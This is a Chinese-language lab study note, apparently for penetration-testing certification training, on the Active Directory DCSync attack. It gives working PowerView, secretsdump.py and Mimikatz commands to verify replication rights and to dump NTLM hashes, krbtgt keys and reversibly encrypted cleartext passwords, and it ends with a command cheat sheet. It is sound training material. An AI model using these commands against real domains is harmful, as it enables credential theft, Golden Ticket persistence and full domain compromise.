# 第 77A 章 - DCSync 攻擊

## 標籤

- #cpts
- #chapter
- #active-directory
- #dcsync
- #credential-dumping
- #mimikatz
- #secretsdump

## 學習目標

- 理解 DCSync 的運作原理與所需的 AD 複寫權限。
- 用 PowerView 確認目標帳號是否具備 DS-Replication-Get-Changes-All 權限。
- 用 secretsdump.py 從 Linux 端執行 DCSync 匯出雜湊值。
- 用 Mimikatz lsadump::dcsync 從 Windows 端執行 DCSync。
- 識別啟用可逆加密的帳號（明文密碼洩漏風險）。

---

## 理論基礎

```text
DCSync 攻擊原理
  → DC 之間透過「目錄複寫服務遠端協定（MS-DRSR）」同步 AD 資料
  → 正常情境：DC-A 向 DC-B 要求複寫差異 → DC-B 回傳帳號雜湊
  → 攻擊者模擬 DC 行為 → 向真實 DC 發起複寫請求 → 取得任意帳號雜湊

所需權限（缺一不可）：
  ┌─────────────────────────────────────────────────────────┐
  │ 權限名稱                              │ GUID 縮寫        │
  ├─────────────────────────────────────────────────────────┤
  │ DS-Replication-Get-Changes            │ Replication-Get  │
  │ DS-Replication-Get-Changes-All        │ Replication-Get  │
  └─────────────────────────────────────────────────────────┘

預設具備這些權限的群組：
  → Domain Admins / Enterprise Admins / Administrators
  → 特別委派的帳號（如 adunn 在 Part.77 ACL 濫用鏈中取得）

攻擊價值：
  → 取得 krbtgt NTLM → 製作 Golden Ticket（網域持久化）
  → 取得任意帳號 NTLM → Pass-the-Hash / Kerberoast 預先破解
  → 啟用可逆加密的帳號 → 直接取得明文密碼
```

---

## 一、確認 DCSync 權限（PowerView）

### 理論

```text
目標：確認 adunn 是否擁有對網域根物件的複寫 ACE
路徑：Get-ObjectAcl 針對網域根 DN → -ResolveGUIDs 將 GUID 轉為可讀名稱
過濾條件：ObjectAceType 匹配 "Replication-Get"

找到後確認：
  → SecurityIdentifier 解析為 adunn
  → ActiveDirectoryRights 含 ExtendedRight
  → ObjectAceType 為 DS-Replication-Get-Changes-All
```

```powershell
# 列出網域根物件上所有含複寫類字串的 ACE
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match "Replication-Get" }

# 輸出欄位判讀：
# ObjectDN              → DC=inlanefreight,DC=local（網域根）
# ActiveDirectoryRights → ExtendedRight（擴充權限，才能觸發複寫）
# ObjectAceType         → DS-Replication-Get-Changes-All / DS-Replication-Get-Changes
# SecurityIdentifier    → 持有者 SID（轉換為帳號名稱見下方）

# 將 SID 轉換為帳號名稱（確認持有者）
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Convert-SidToName $sid
# 輸出：INLANEFREIGHT\adunn
```

---

## 二、DCSync — Linux 端（secretsdump.py）

### 理論

```text
secretsdump.py（Impacket）
  → 以具備複寫權限的帳號憑證，向 DC 發起 MS-DRSR 請求
  → 不需在 DC 上執行程式，純遠端操作
  → 輸出：NTLM 雜湊 / Kerberos 金鑰 / 可逆加密明文

常用旗標：
  -just-dc              → 只匯出 DC 的 AD 帳號資料（NT + Kerberos）
  -just-dc-ntlm         → 只匯出 NTLM 雜湊（較精簡）
  -just-dc-user USER    → 只匯出指定帳號
  -pwd-last-set         → 附帶密碼最後設定時間
  -history              → 附帶密碼歷史（若有儲存）
  -user-status          → 顯示帳號是否啟用/停用

輸出檔案（-outputfile 指定前綴）：
  PREFIX.ntds           → NT 雜湊（主要）
  PREFIX.ntds.cleartext → 明文密碼（可逆加密帳號）
  PREFIX.ntds.kerberos  → Kerberos 金鑰
```

```bash
# 使用 adunn 的雜湊（Pass-the-Hash 模式，-hashes 格式 LM:NT）
secretsdump.py -outputfile inlanefreight_hashes \
  -just-dc \
  INLANEFREIGHT/adunn@172.16.5.5 \
  -hashes 00000000000000000000000000000000:7796ee39fd3a9c3a1573a4ef4b2d... # adunn NTLM

# 只匯出 NTLM（更精簡）
secretsdump.py -outputfile inlanefreight_hashes \
  -just-dc-ntlm \
  INLANEFREIGHT/adunn@172.16.5.5

# 匯出並附帶密碼設定時間與帳號狀態（輔助研判）
secretsdump.py -outputfile inlanefreight_hashes \
  -just-dc-ntlm \
  -pwd-last-set \
  -user-status \
  INLANEFREIGHT/adunn@172.16.5.5

# 只匯出 krbtgt（製作 Golden Ticket 最小化操作）
secretsdump.py -outputfile inlanefreight_hashes \
  -just-dc-user krbtgt \
  INLANEFREIGHT/adunn@172.16.5.5

# 輸出判讀（.ntds 檔案格式）：
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639c264efd43eba59f...:::
#   欄位：帳號:RID:LM雜湊:NT雜湊:::
#   LM 雜湊固定為 aad3b435...（空值）→ 只需 NT 雜湊
```

---

## 三、DCSync — Windows 端（Mimikatz）

### 理論

```text
Mimikatz lsadump::dcsync
  → 從 Windows 環境（已有 AD 帳號憑證）執行 DCSync
  → 需使用具複寫權限的帳號，但不一定要在 DC 上執行
  → runas /netonly 允許以指定憑證啟動程序，本機身份不變，網路請求使用指定帳號

執行前置步驟：
  1. runas /netonly 開啟具複寫權限帳號的 CMD
  2. 在該 CMD 內啟動 Mimikatz
  3. privilege::debug（提升偵錯權限）
  4. lsadump::dcsync /domain /user（指定目標）
```

```cmd
:: 以 adunn 的憑證開啟新 CMD（/netonly = 只影響網路驗證）
runas /netonly /user:INLANEFREIGHT\adunn cmd.exe
:: 輸入 adunn 密碼

:: 在新 CMD 中啟動 Mimikatz
.\mimikatz.exe
```

```mimikatz
# 提升偵錯權限（必要）
privilege::debug
# 輸出：Privilege '20' OK → 成功

# DCSync 匯出 adunn（確認自己）
lsadump::dcsync /domain:inlanefreight.local /user:INLANEFREIGHT\adunn

# DCSync 匯出 krbtgt（Golden Ticket 材料）
lsadump::dcsync /domain:inlanefreight.local /user:INLANEFREIGHT\krbtgt

# 輸出欄位判讀：
# Object RDN   : krbtgt（帳號名稱）
# Hash NTLM    : 16cc98b7... → NT 雜湊（主要使用值）
# Hash LM      : ...         → 通常空值
# Supplemental Credentials:
#   * Primary:Kerberos → Kerberos 金鑰（AES128/AES256）
#   * Primary:WDigest  → WDigest 雜湊（若啟用）

# DCSync 匯出 Administrator
lsadump::dcsync /domain:inlanefreight.local /user:INLANEFREIGHT\Administrator
```

---

## 四、可逆加密帳號偵測（明文密碼洩漏）

### 理論

```text
可逆加密（Reversible Encryption）
  → userAccountControl 旗標 128（0x80）= ENCRYPTED_TEXT_PWD_ALLOWED
  → 啟用後 AD 以可逆方式儲存密碼 → DCSync 可直接取得明文
  → 用途：部分舊版協定（如 CHAP、Digest Authentication）需要明文

secretsdump.py 輸出：
  → .ntds.cleartext 檔案中列出明文密碼
  → 輸出格式：帳號:明文密碼（非雜湊）

列舉方式（兩種）：
  1. RSAT Get-ADUser（原生 AD 模組）
  2. PowerView Get-DomainUser（篩選 useraccountcontrol 字串）
```

```powershell
# 方法一：RSAT Get-ADUser（篩選 userAccountControl bit 128）
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl |
  Select-Object Name, userAccountControl

# -band 128 → 位元 AND 判斷，128 = ENCRYPTED_TEXT_PWD_ALLOWED 旗標
# 有輸出的帳號 → 密碼以可逆加密方式儲存

# 方法二：PowerView（不依賴 RSAT）
Get-DomainUser -Identity * |
  Where-Object { $_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' } |
  Select-Object samaccountname, useraccountcontrol

# 兩種方法結果相同，PowerView 較通用（不需 RSAT 模組）

# secretsdump.py 輸出明文的欄位（.ntds.cleartext 範例）：
# proxyagent:Pr0xy_Pr0xy_123456
# syncron:6qhS5X2WpbNLSfVP
# → 這些帳號的密碼已明文洩漏，可直接用於橫向移動
```

---

## 判斷邏輯

```
取得具 DS-Replication-Get-Changes-All 的帳號
├── 確認方法
│   └── Get-ObjectAcl "DC=..." -ResolveGUIDs | ? ObjectAceType -match "Replication-Get"
│       → 找到目標帳號 SID → Convert-SidToName 確認
│
├── Linux 執行（secretsdump.py）
│   ├── 有明文密碼 → -just-dc（含 .ntds.cleartext）
│   ├── 只需 NTLM → -just-dc-ntlm
│   ├── 只需特定帳號 → -just-dc-user USER
│   └── 需研判帳號活躍度 → -pwd-last-set -user-status
│
├── Windows 執行（Mimikatz）
│   ├── 已有帳號密碼 → runas /netonly → mimikatz → lsadump::dcsync
│   └── 目標帳號選擇：
│       ├── krbtgt → Golden Ticket（持久化）
│       ├── Administrator → 直接提權
│       └── 其他高權限帳號 → Pass-the-Hash
│
└── 後處理
    ├── .ntds 中找 krbtgt → 製作 Golden Ticket
    ├── .ntds.cleartext 找可逆加密明文 → 直接使用密碼
    └── 可逆加密帳號列舉：Get-ADUser -Filter 'userAccountControl -band 128'
```

---

## 速查表

```bash
# Linux - DCSync 完整匯出（含明文）
secretsdump.py -outputfile hashes -just-dc DOMAIN/user@DC_IP

# Linux - 只匯 NTLM + 帳號狀態
secretsdump.py -outputfile hashes -just-dc-ntlm -pwd-last-set -user-status DOMAIN/user@DC_IP

# Linux - 只匯 krbtgt
secretsdump.py -outputfile hashes -just-dc-user krbtgt DOMAIN/user@DC_IP
```

```powershell
# 確認複寫權限（PowerView）
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match "Replication-Get" }

# 可逆加密帳號（RSAT）
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# 可逆加密帳號（PowerView）
Get-DomainUser -Identity * |
  Where-Object { $_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' }
```

```mimikatz
# Mimikatz DCSync
privilege::debug
lsadump::dcsync /domain:inlanefreight.local /user:INLANEFREIGHT\krbtgt
lsadump::dcsync /domain:inlanefreight.local /user:INLANEFREIGHT\Administrator
```

---

## 關聯筆記

- [[77-ADACL濫用|第 77 章 - AD ACL 濫用]]（adunn 的複寫權限來源）
- [[78-GPO與信任關係濫用|第 78 章 - GPO 與信任關係濫用]]
- [[80-網域主導與持久化|第 80 章 - 網域主導與持久化]]（Golden Ticket 應用）
- [[09-Volume-9-Active-Directory-Index|Vol.9 - Active Directory]]
